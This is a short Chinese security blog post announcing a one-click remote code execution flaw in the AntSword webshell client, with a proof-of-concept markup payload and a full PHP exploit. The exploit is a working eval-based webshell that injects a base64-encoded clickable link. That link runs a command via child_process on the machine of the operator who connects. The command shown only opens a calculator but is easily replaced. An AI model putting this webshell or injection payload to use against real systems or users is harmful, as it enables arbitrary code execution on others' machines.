#  蚁剑爆出1click rce，执行命令即可上线  
原创 秋风
                    秋风  秋风的安全之路   2026-04-27 07:38  
  
参考：  
https://github.com/AntSwordProject/antSword/issues/370  
  
POC：  
```
[[!;;;;javascript:void(require(`child_process`).exec(`calc.exe`))]{http://localhost/phpmyadmin/}]
```  
  
exp:  
```
$pass = 'test';
if (!isset($_POST[$pass])) {
    http_response_code(404);
    exit;
}

$code = $_POST[$pass];

if (!function_exists('get_magic_quotes_gpc')) {
    function get_magic_quotes_gpc() { return 0; }
}

$payload = '[[!;;;;javascript:void(require(`child_process`).exec(`open -a Calculator`))]{Click here for phpMyAdmin}]';
$b64payload = base64_encode("\n" . $payload);
$inject = 'echo base64_decode("' . $b64payload . '");';

// 只在终端命令请求时注入 (包含 system/exec/passthru/popen 等命令执行函数)
if (preg_match('/\bsystem\b|\bexec\b|\bpassthru\b|\bpopen\b|\bshell_exec\b|\bproc_open\b/', $code)) {
    $code = str_replace('asoutput();', $inject . 'asoutput();', $code);
}

@eval($code);
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ogrJiczzwv0BsH9pibJPY381ZmMHic6KNI6jVJO0NtIZExeTJagMmud3ybY63Y6vTgnbgfT4OuAyq63I4Lw5jHnJ6NbcBibibAATXib7hZCeR9icto/640?wx_fmt=jpeg "")  
  
  
